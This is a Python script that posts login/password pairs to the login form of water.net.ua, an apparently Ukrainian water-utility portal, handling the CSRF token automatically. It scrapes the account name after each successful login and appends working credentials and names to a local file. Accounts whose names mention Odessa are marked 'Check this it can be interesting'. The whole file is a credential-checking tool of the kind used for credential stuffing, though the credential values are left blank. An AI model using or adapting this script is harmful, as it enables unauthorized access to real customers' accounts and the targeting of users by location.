import requests
from bs4 import BeautifulSoup
import time

headers = {
    'authority': 'water.net.ua',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uk;q=0.6',
    'cache-control': 'max-age=0',
       'origin': 'https://water.net.ua',
    'referer': 'https://water.net.ua/login',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}


def parse_candidate(login, password):
    data = {
        # '_csrf': 'uK4oOHTVAY_8xvpuVZRhojbuyDX7HLm3v2eR8TmkrZLo-ndsIJBIwrOkiSYB8xXsBpayVpZKycbPAfbCaZXg-A==',
        'LoginForm[username]': login,
        'LoginForm[password]': password,
        'LoginForm[rememberMe]': [
            '0',
            '1',
        ],
        'login-button': '',
    }

    with requests.Session() as request:
        login_page_response = request.get('https://water.net.ua/login', headers=headers)
        csrf_token = BeautifulSoup(login_page_response.content, 'html.parser').find('input', {'name': '_csrf'}).get(
            'value')

        data['_csrf'] = csrf_token

        home_page_response = request.post('https://water.net.ua/login', headers=headers, data=data)

        if home_page_response.status_code == 200:
            try:
                name = BeautifulSoup(home_page_response.content, 'html.parser').find('div', {'class': 'logo'}).find('a', {
                    'class': 'simple-text'}).text.strip()
            except:
                name="not found"
            caution = ['одеса', 'одесса', 'odessa', 'odesa']
            user_data = {'login': login, 'password': password, "name": name, "caution": False}

            if any(map(lambda x: x in name.lower(), caution)):
                user_data['caution'] = True

            # if 'одеса' or 'oдесса' in name.lower():
            #     user['caution'] = True

            return user_data
        else:
            return {}



with open('data.txt', 'a') as file:
    for number in range(0, 3):
        login = ''
        password = ''

        user = parse_candidate(login, password)

        if not user:
            continue
        else:

            line = f"login:{user['login']} | password: {user['password']} | name:{user['name']}"
            if user['caution']:
                line += " !!!! Check this it can be interesting !!!!"
            print(line)
            file.write(line + '\n')

        time.sleep(3)
